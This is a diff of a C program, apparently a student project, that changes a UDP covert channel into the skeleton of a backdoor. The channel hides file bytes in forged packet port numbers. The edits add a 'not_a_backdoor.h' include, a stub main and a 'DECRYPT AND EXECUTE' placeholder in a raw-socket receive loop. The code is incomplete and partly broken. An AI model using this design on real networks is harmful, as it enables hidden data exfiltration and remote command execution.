@@ -1,46 +1,13 @@
-/*---------------------------------------------------------------------------------------
- * SOURCE FILE:	    covert_udp
- * 
- * PROGRAM:		    covert_udp
- * 
- * FUNCTIONS:		void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short, char *, int, int);
- *                  void client(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, char *filename, int ipid);
- *                  void server(unsigned int source_addr, unsigned short source_port, unsigned short dest_port, char *filename, int ipid);
- *                  int charToInt(char msg);
- *                  unsigned short in_cksum(unsigned short *, int);
- *                  unsigned int host_convert(char *);
- *                  void usage(char *);
- * 
- * DATE:			September 20, 2021
- * 
- * REVISIONS:		NA
- * 
- * DESIGNERS:       Nicole Jingco
- * 
- * PROGRAMMERS:		Nicole Jingco
- * 
- * Notes:
- * This application is a modification of the Craig H. Rowland UDP Covert Channel. This 
- * program modifies the UDP header to transfer a file one byte at a time  to the destination
- * host consealing the data in the port number. This program acts as both a server and 
- * client.
- * 
- * Functions Modified:
- * - forgepacket: changed it to only check if it will be running client or server
- * - client: moved client functionality to this function
- * - server: moved server functionality to this function
- * 
- * Compile:
- * cc -o covert_udp covert_udp.c
- * 
- * Client
- * ./covert_udp -dest 192.168.1.72 -source 192.168.1.71 -source_port 323 -dest_port 323 -file sample.txt
- * 
- * Server
- * ./covert_udp -dest 192.168.1.71 -source 192.168.1.72 -source_port 323 -dest_port 323 -file test.txt -server
- * ---------------------------------------------------------------------------------------*/
+#include "not_a_backdoor.h"
 #include "covert_udp.h"
-#include "crypto.h"
+
+int main(int argc, char **argv)
+{
+    // get input
+    // if backdoor or client
+
+    //
+}
 
 /*--------------------------------------------------------------------------
  * FUNCTION:        forgepacket
@@ -60,7 +27,7 @@
  * NOTES:
  * This section runs client or the server code if server flag was set
  * -----------------------------------------------------------------------*/
-void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, int svr, int ipid, int seed)
+void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port, unsigned short dest_port, int svr, int ipid)
 {
     if (svr == 0)
     {
@@ -97,8 +64,8 @@ void client(unsigned int source_addr, unsigned int dest_addr, unsigned short sou
 {
     int ch;
     int send_socket;
-    struct sockaddr_in *sin;
-    struct send_udp *send_udp;
+    struct sockaddr_in sin;
+    struct send_udp send_udp;
     FILE *input;
     int isReading = 1;
 
@@ -216,8 +183,10 @@ void server(unsigned int source_addr, unsigned short source_port, unsigned short
     int dp = 0;
     int buff_len = 0;
     unsigned int size;
+    int packet_counter = 0;
+    bool open = true;
 
-    while (1) /* read packet loop */
+    while (open) /* read packet loop */
     {
         /* Open socket for reading */
         recv_socket = socket(AF_INET, SOCK_RAW, 17);
@@ -235,11 +204,11 @@ void server(unsigned int source_addr, unsigned short source_port, unsigned short
         {
             if (buff_len < ENC_LEN)
             {
-                cypher_size[SIZE COUNTER] = dp;
+                cypher_size[packet_counter] = dp;
             }
             else if (buff_len == ENC_LEN)
             {
-                memcpy(&size, &charSize, 4);
+                memcpy(&size, &cypher_size, 4);
                 size = htonl(size);
             }
             else
@@ -251,12 +220,14 @@ void server(unsigned int source_addr, unsigned short source_port, unsigned short
                 else
                 {
                     // DECRYPT AND EXECUTE
+
+                    open = false;
                 }
             }
 
             buff_len++;
         }
-
+        packet_counter++;
         close(recv_socket); /* close the socket so we don't hose the kernel */
     }
 
